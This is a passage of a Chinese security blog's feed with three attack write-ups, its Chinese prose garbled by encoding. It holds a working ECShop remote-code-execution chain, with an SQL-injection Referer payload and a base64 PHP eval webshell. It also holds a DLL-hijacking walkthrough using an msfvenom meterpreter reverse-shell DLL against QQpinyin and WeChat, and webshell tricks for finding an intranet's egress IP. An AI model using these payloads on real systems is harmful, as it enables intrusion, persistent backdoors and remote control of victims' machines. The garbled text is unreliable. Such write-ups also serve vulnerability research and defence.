class="string">'; ?&gt;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ›™å…‰äº†ï¼Œå°±æ˜¯å¦‚æœç¬¬ä¸€ä½æ˜¯<code>$</code>çš„è¯ï¼Œå°±è¿”å›ç»™_evalå‡½æ•°ä¸€ä¸ªå¸¦æœ‰phpæ ‡ç­¾çš„ä»£ç ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šç»è¿‡ä¸€ä¸ª<code>get_val()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $moddb = explode(<span class="string">'|'</span>, $val);</span><br><span class="line">            $val = array_shift($moddb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $all = explode(<span class="string">'.$'</span>, $val);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $p = implode(<span class="string">''</span>, $all);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $p = <span class="keyword">$this</span>-&gt;make_var($val);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>å½“ä¼ å…¥çš„å˜é‡æ²¡æœ‰.$æ—¶ï¼Œè°ƒç”¨<code>$this-&gt;make_var</code>ï¼Œçœ‹çœ‹make_var<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">            &#123;</span><br><span class="line">                $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">            &#125;</span><br><span class="line">            $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">            $_var_name = array_shift($t);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$_var_name]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$_var_name]))</span><br><span class="line">            &#123;</span><br><span class="line">                $_var_name = <span class="keyword">$this</span>-&gt;_patchstack[$_var_name];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($_var_name == <span class="string">'smarty'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                 $p = <span class="keyword">$this</span>-&gt;_compile_smarty_ref($t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $p = <span class="string">'$this-&gt;_var[\''</span> . $_var_name . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> ($t <span class="keyword">AS</span> $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $p.= <span class="string">'[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿”å›çš„<code>$p</code>å˜æˆäº†<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $_var_name . &#39;\&#39;]&#39;</code><br>å¾€å›çœ‹ï¼Œæˆ‘ä»¬çš„selectå‡½æ•°returnçš„å€¼å°±å˜æˆäº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'  $val  '</span>];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åç»“åˆä¸Šé¢è¿›å…¥å‡½æ•°çš„æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åå› ä¸ºä¸æ»¡è¶³fetch_strçš„æ­£åˆ™ï¼ŒåŠ ä¸€ä¸ª<code>/**/</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åå°±æ˜¯åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ï¼Œè®©<code>$position_style</code>ç­‰äºæˆ‘ä»¬çš„payloadäº†</p><p>æœ€ç»ˆpayload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p>ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨<code>$arr[&#39;id&#39;]</code>å’Œ<code>$arr[&#39;num&#39;]</code> æ³¨é‡Šæ‰ä¸­é—´çš„ <code>order by å’Œ limit</code>ï¼Œå¼ºåˆ¶æ‰§è¡ŒUNIONï¼Œå¸¦å…¥<code>position_style</code></p><p>å’Œä¹‹å‰çš„APTæ”»å‡»ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥å¸¦å…¥ä¸€ä¸ªæ— æ–‡ä»¶Webshell:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d</span></span><br><span class="line"><span class="comment"># unhex</span></span><br><span class="line">&#123;$a<span class="string">'];assert(base64_decode('</span>QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7<span class="string">'));$a['</span><span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_decode</span></span><br><span class="line">@<span class="keyword">EVAL</span>(base64_decode($_POST[<span class="string">'Nox'</span>]));</span><br></pre></td></tr></table></figure></p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>Ecshop è¿˜æ˜¯è§çš„æ¯”è¾ƒå¤šï¼Œç”¨é€”ä¹Ÿæ¯”è¾ƒå¹¿ï¼Œç‰¹åˆ«æ˜¯ç°åœ¨å„ç±»åŒºå—é“¾çš„ç½‘ç«™ï¼Œç”¨çš„è¿˜æ˜¯æ¯”è¾ƒå¤š</p><p>3.xåŒæ ·ä¹Ÿå¯ä»¥rceï¼Œåªæ˜¯éœ€è¦ç²¾å¿ƒæ„é€ payloadï¼Œå› ä¸ºéœ€è¦ç»•è¿‡wafï¼Œä½†æ˜¯404çš„å¸ˆå‚…è¯´å…¶å®å°†union selecté€šè¿‡ä¸¤ä¸ªå‚æ•°ä¼ é€’è¿›å»ï¼Œä¸€ä¸ªå‚æ•°ä¼ é€’ä¸€ä¸ªå…³é”®å­—ï¼Œä¸­é—´çš„å¯ä»¥ä½¿ç”¨<code>/**/</code>æ³¨é‡Šæ‰ï¼Œè¿™æ ·å°±ä¸ä¼šè§¦å‘WAFäº†23333</p><h2 id="0x05-Links"><a href="#0x05-Links" class="headerlink" title="0x05 Links"></a>0x05 Links</h2><p><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">https://paper.seebug.org/695/</a><br><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">https://xz.aliyun.com/t/2689</a><br><a href="https://www.seebug.org/vuldb/ssvid-97343" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97343</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-27 00:03:02&lt;br&gt;&lt;img src=&quot;/wallpaper/[60268880.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DLL Hijacking</title>
    <link href="http://patrilic.top/2019/08/23/DLL%20Hijacking/"/>
    <id>http://patrilic.top/2019/08/23/DLL Hijacking/</id>
    <published>2019-08-23T04:18:04.000Z</published>
    <updated>2019-08-27T18:08:49.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Authro: Patrilic<br>@Time: 2019-08-23 12:18:04<br><img src="/wallpaper/75773182_p0.jpg" alt></p></blockquote><h2 id="0x00-Introduce"><a href="#0x00-Introduce" class="headerlink" title="0x00 Introduce"></a>0x00 Introduce</h2><p>DLL Hijackingï¼Œ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯DLLåŠ«æŒï¼Œåˆ©ç”¨DLLåŠ«æŒï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨æ¶æ„dllæ–‡ä»¶æ¥æ‰§è¡Œshellcodeã€‚<br>æ‰€ä»¥ï¼ŒDLLæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<br><a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a></p><p>ç®€å•æ¥è¯´ï¼Œexeæ–‡ä»¶æœ¬èº«ä¸éœ€è¦å¾ˆå¤šå‡½æ•°ï¼Œè€Œæ˜¯å»è°ƒç”¨DLLæ–‡ä»¶ä¸­çš„å‡½æ•°ï¼Œå½“è¿›ç¨‹è¿è¡Œåˆ°éœ€è¦è°ƒç”¨æ—¶ï¼Œå°±å»ä»æ–‡ä»¶ä¸­è°ƒç”¨å¯¹åº”çš„å‡½æ•°ï¼Œç„¶åå½“æˆ‘ä»¬èƒ½å¤Ÿä¸­é—´æ’å…¥è‡ªå·±çš„DLLå¹¶æƒ³åŠæ³•è®©ç¨‹åºè¿è¡Œæˆ‘ä»¬çš„DLLæ—¶ï¼Œå°±é€ æˆäº†åŠ«æŒã€‚</p><h2 id="0x01-DLL-Hijacking"><a href="#0x01-DLL-Hijacking" class="headerlink" title="0x01 DLL Hijacking"></a>0x01 DLL Hijacking</h2><p><code>DLL hijacking</code> åœ¨ CWEä¸Šåˆåï¼š <code>Untrusted Search Path Vulnerability</code><br><a href="https://cwe.mitre.org/data/definitions/426.html" target="_blank" rel="noopener">https://cwe.mitre.org/data/definitions/426.html</a></p><p>dllåŠ«æŒé€šè¿‡åˆ©ç”¨DLLçš„åŠ è½½é¡ºåºï¼Œè®©æˆ‘ä»¬çš„æ¶æ„dllåœ¨æ­£å¸¸çš„dllå‰é¢åŠ è½½ï¼Œå°±å¯ä»¥è¿›è¡ŒåŠ«æŒäº†</p><h3 id="DLL-Search-Order"><a href="#DLL-Search-Order" class="headerlink" title="DLL Search Order"></a>DLL Search Order</h3><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹dllçš„åŠ è½½é¡ºåºï¼š<br>å®˜æ–¹æ–‡æ¡£ï¼š <a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order</a></p><p>åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ§åˆ¶ä¸€ä¸ªDLLçš„åŠ è½½è·¯å¾„ï¼šä½¿ç”¨å…¨è·¯å¾„åŠ è½½ã€ä½¿ç”¨DLLé‡å®šå‘ã€ä½¿ç”¨manifestæ–‡ä»¶ã€‚å¦‚æœä¸Šè¿°ä¸‰ç§æ–¹å¼å‡æœªæŒ‡å®šï¼Œç³»ç»ŸæŸ¥æ‰¾DLLçš„é¡ºåºå°†æŒ‰ç…§æœ¬éƒ¨åˆ†æè¿°çš„é¡ºåºè¿›è¡Œã€‚</p><p>ç„¶åè¿™é‡Œæœ‰ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œå¯¹ä»¥ä¸‹ä¸¤ç§æƒ…å†µçš„DLLï¼Œç¨‹åºä¸ä¼šæŸ¥æ‰¾ï¼Œè€Œæ˜¯ç›´æ¥å¼•ç”¨</p><ol><li>å¯¹äºå·²ç»åŠ è½½åˆ°å†…å­˜ä¸­çš„åŒåDLLï¼Œç³»ç»Ÿä½¿ç”¨å·²ç»åŠ è½½çš„DLLï¼Œå¹¶ä¸”å¿½ç•¥å¾…åŠ è½½DLLçš„è·¯å¾„ã€‚ï¼ˆæ³¨æ„å¯¹æŸä¸ªè¿›ç¨‹è€Œè¨€ï¼Œç³»ç»Ÿå·²ç»åŠ è½½çš„DLLä¸€å®šæ˜¯å”¯ä¸€çš„å­˜åœ¨äºæŸä¸ªç›®å½•ä¸‹ã€‚ï¼‰</li><li>å¦‚æœè¯¥DLLå­˜åœ¨äºæŸä¸ªWindowsç‰ˆæœ¬çš„å·²çŸ¥DLLåˆ—è¡¨ï¼ˆunkown DLLï¼‰ä¸­ï¼Œç³»ç»Ÿä½¿ç”¨å·²çŸ¥DLLçš„æ‹·è´ï¼ˆåŒ…æ‹¬å·²çŸ¥DLLçš„ä¾èµ–é¡¹ï¼‰ã€‚å·²çŸ¥DLLåˆ—è¡¨å¯ä»¥ä»å¦‚ä¸‹æ³¨å†Œè¡¨é¡¹çœ‹åˆ°ï¼š<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLsã€‚<br><img src="/DLL Hijacking.resources/FE85E1B9-4C3C-40C2-8680-64BBCF2D9714.png" alt="0c6f2cf4e21cd827fdff57790b3a5982"></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.ç¨‹åºæ‰€åœ¨ç›®å½•</span><br><span class="line">2.ç¨‹åºåŠ è½½ç›®å½•ï¼ˆSetCurrentDirectoryï¼‰</span><br><span class="line">3.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•</span><br><span class="line">4.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•</span><br><span class="line">5.Windowsç›®å½•</span><br><span class="line">6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½•</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>ProcessMonitor</code>æ¥ç›‘æ§è¿›ç¨‹<br>å¯ä»¥é€šè¿‡ğŸ‘‰<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon</a>ä¸‹è½½</p><h3 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it"></a>Do it</h3><p>è¿™é‡Œä½¿ç”¨è‡ªåŠ¨åŒ–çš„å®¡è®¡å·¥å…·è¿›è¡ŒDLLåŠ«æŒåˆ†æ<br>æ¨èWindowsä¸‹ä½¿ç”¨<code>Dll Hijack Auditor</code></p><p>æˆ‘ä»¬ä»¥Vc++6.0ç¼–è¾‘å™¨ä¸ºä¾‹<br><img src="/DLL Hijacking.resources/D23C6ACE-1F0D-498E-BF55-353C064EEAAF.png" alt="fec186d523049fcb19d40672cee5dd97"></p><p>ç”ŸæˆæŠ¥å‘Š</p><p><img src="/DLL Hijacking.resources/54857F75-C5A0-48E1-9CEF-0EDA6FA7CA1A.png" alt="d09587368427f553d0cb26464aed4cb3"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨dllå¯ä»¥åŠ«æŒ</p><p>ç„¶è€Œè¿™ä¸ªæˆ‘å‘ç°ï¼Œå¥½åƒå¹¶ä¸èƒ½ä½¿ç”¨2333<br>é‚£è¦æ€ä¹ˆæ‰‹åŠ¨å¯»æ‰¾å‘¢ï¼Ÿåæ­£DLLçš„åŠ è½½ï¼Œæˆ‘ä»¬åªéœ€è¦ä»ç¨‹åºå·²ç»åŠ è½½çš„DLLåˆ—è¡¨ä¸­ï¼ŒæŸ¥æ‰¾åœ¨â€œKnownDLLsæ³¨å†Œè¡¨é¡¹â€ä¸­ä¸å­˜åœ¨çš„DLLã€‚<br>ç„¶åå°†æ¶æ„dllæ”¾åœ¨ç¨‹åºå½“å‰ç›®å½•å³å¯</p><p>ç„¶åè¿˜æœ‰ä¸¤ä¸ªåˆ©å™¨ï¼š</p><blockquote><p>Robber <a href="https://github.com/MojtabaTajik/Robber" target="_blank" rel="noopener">https://github.com/MojtabaTajik/Robber</a><br>Rattler <a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a></p></blockquote><h3 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h3><p>ç”¨å€¾æ—‹å¸ˆå‚…ä¹‹å‰æ‰¾åˆ°çš„<code>QQpinyin</code>æ¥åšä¸€ä¸ªæ¼”ç¤º<br><a href="https://payloads.online/archivers/2018-06-09/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-06-09/1</a></p><h4 id="Msf"><a href="#Msf" class="headerlink" title="Msf"></a>Msf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=182.168.0.101 LPORT=10001 -f dll &gt; ntmarta.dll</span><br></pre></td></tr></table></figure><p><img src="/DLL Hijacking.resources/9FB73E4A-74F4-4249-BD44-673EEE8A9EEC.png" alt="a0ea9b499f1498e7e373e0b512242577"></p><h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p><img src="/DLL Hijacking.resources/6D6847BA-6F9A-4355-AE3D-363C27F39C9F.png" alt="278aa9975763a654cec4763eb5ab3792"><br>åŒæ ·çš„æ“ä½œï¼Œåå¼¹beacon<br><img src="/DLL Hijacking.resources/1ED21E64-7A9E-410D-A239-50D5CDD5D592.png" alt="9f382d5e297f99185e2a16bd456773b4"></p><h3 id="Weixin-DLL-Hijacking"><a href="#Weixin-DLL-Hijacking" class="headerlink" title="Weixin DLL Hijacking"></a>Weixin DLL Hijacking</h3><p>å¾®ä¿¡PCç‰ˆç›¸ä¿¡è¿˜æ˜¯ç”¨çš„æ¯”è¾ƒå¤šçš„ï¼Œä¹Ÿå¸¸å¸¸èƒ½åœ¨ä¸€äº›å…¬å¸ç”µè„‘ä¸Šçœ‹åˆ°ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„ä¹‰çš„<br><img src="/DLL Hijacking.resources/3A39C9B1-24B6-4F0A-9F6E-BD1889CAAAA7.png" alt="93bf7e673548524925a9b63f75a3cf5a"><br>å½“ç„¶ï¼ŒProcessMonitorä¹Ÿèƒ½çœ‹åˆ°<br><img src="/DLL Hijacking.resources/12CDE5AD-5981-4771-8F6D-8082FDF95749.png" alt="d4f968dca3dd7e6f373693bcfc79fc31"><br>æ„é€ payloadåŠ«æŒå³å¯<br><img src="/DLL Hijacking.resources/FCEBA963-4F3C-4F21-A968-E08EFC4741B6.png" alt="f17d81c5fc84f728b4f876ed68c2e51d"></p><h2 id="0x02-Summary"><a href="#0x02-Summary" class="headerlink" title="0x02 Summary"></a>0x02 Summary</h2><p>DLLåŠ«æŒä¹Ÿæ˜¯è€çš„ä¸è¡Œçš„ä¸€ä¸ªæ¼æ´äº†ï¼Œä½†æ˜¯åœ¨è¿›è¡Œç»´æƒï¼ŒæŒç»­æ¸—é€çš„æ–¹é¢ï¼Œä¸€ç›´éƒ½æ¯”è¾ƒå‰å®³ã€‚<br>çœŸå®ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªåŠ å¯†çš„DLLæ–‡ä»¶ï¼Œä»DLLMainé‡Œè¿›è¡Œè°ƒç”¨ï¼Œå›å¼¹shellçš„åŒæ—¶ï¼Œä¹Ÿå®Œæˆç¨‹åºçš„æ­£å¸¸åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹ç”¨æˆ·å¸¸ç”¨è½¯ä»¶çš„DLLåŠ«æŒï½è™šæµ®äº†</p><h2 id="0x03-Other-to-Learn"><a href="#0x03-Other-to-Learn" class="headerlink" title="0x03 Other to Learn"></a>0x03 Other to Learn</h2><p><a href="https://www.52pojie.cn/thread-830796-1-1.html" target="_blank" rel="noopener">ä¸€ç§é€šç”¨DLLåŠ«æŒæŠ€æœ¯ç ”ç©¶</a><br><a href="https://www.cnblogs.com/h2zZhou/p/8601375.html" target="_blank" rel="noopener">è€æ ‘å¼€æ–°èŠ±ï¼šDLLåŠ«æŒæ¼æ´æ–°ç©æ³•</a><br><a href="http://www.anquan.us/static/drops/tips-13238.html" target="_blank" rel="noopener">æ·±å…¥è§£æDLLåŠ«æŒæ¼æ´</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Authro: Patrilic&lt;br&gt;@Time: 2019-08-23 12:18:04&lt;br&gt;&lt;img src=&quot;/wallpaper/75773182_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="http://patrilic.top/categories/ATT-CK/"/>
    
    
      <category term="DLL Hijacking" scheme="http://patrilic.top/tags/DLL-Hijacking/"/>
    
  </entry>
  
  <entry>
    <title>å¯»æ‰¾å†…ç½‘å‡ºå£ip</title>
    <link href="http://patrilic.top/2019/08/20/%E5%AF%BB%E6%89%BE%E5%86%85%E7%BD%91%E5%87%BA%E5%8F%A3ip/"/>
    <id>http://patrilic.top/2019/08/20/å¯»æ‰¾å†…ç½‘å‡ºå£ip/</id>
    <published>2019-08-20T12:14:23.000Z</published>
    <updated>2020-03-14T15:07:54.125Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-20 20:14:23<br><img src="/wallpaper/30597.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ™šä¸Šåƒäº†é¥­å›é…’åº—ï¼Œä¸€è§‰ç¡é†’ï¼Œå‘ç°æœ‰ä¸ªå¸ˆå‚…é—®æˆ‘windowsæœºå™¨åªæœ‰webshellæ€ä¹ˆæ‰¾å†…ç½‘çš„å‡ºå£ipï¼Œæƒ³äº†æƒ³ç¡®å®æ²¡æ€»ç»“è¿‡è¿™ä¸ªä¸œè¥¿ï¼ˆä¸»è¦æ˜¯å¹³æ—¶éƒ½æ˜¯ç›´æ¥åå¼¹ä¸ªshelläº†..ï¼‰</p><p>ä»”ç»†æƒ³æƒ³ï¼Œå…¶å®æŒºå¥½ç©çš„ï¼Œç„¶åå°±å’Œå‡ ä¸ªå¸ˆå‚…è®¨è®ºäº†ä¸‹ï¼Œæ„Ÿè§‰å¤§æ¦‚å°±ä¸‹é¢è¿™å‡ ç§æ–¹å¼ï¼Œå¦‚æœæœ‰ä¸è¶³è¯·å¸ˆå‚…è¡¥å……ï½</p><h2 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h2><p>Linux ç”±äºåŸºæœ¬è‡ªå¸¦ <code>curl</code>å’Œ<code>wget</code>,<code>telnet</code>å‘½ä»¤ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl cip.cc</span><br></pre></td></tr></table></figure><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/F90295F8-F123-4CB2-B957-05DD554F0EA4.png" alt="e6ee0f98f7abc8edc984f243e1c42370"></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet cip.cc</span><br></pre></td></tr></table></figure><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/64B82503-12DC-42B1-AF78-AD72FA1B84F8.png" alt="1ba6f6948d7f30c013c7a0e680e26d18"></p><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>åˆ©ç”¨ncç›‘å¬ç«¯å£ï¼Œç„¶ålinuxç«¯ä½¿ç”¨wgetå‘½ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget xxx.xxx.xxx.xxx:90</span><br></pre></td></tr></table></figure><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/B7E37635-F0C6-4083-9EE4-E925957C12B1.png" alt="34f53887bd6dfad3b33469c64b746c45"></p><h3 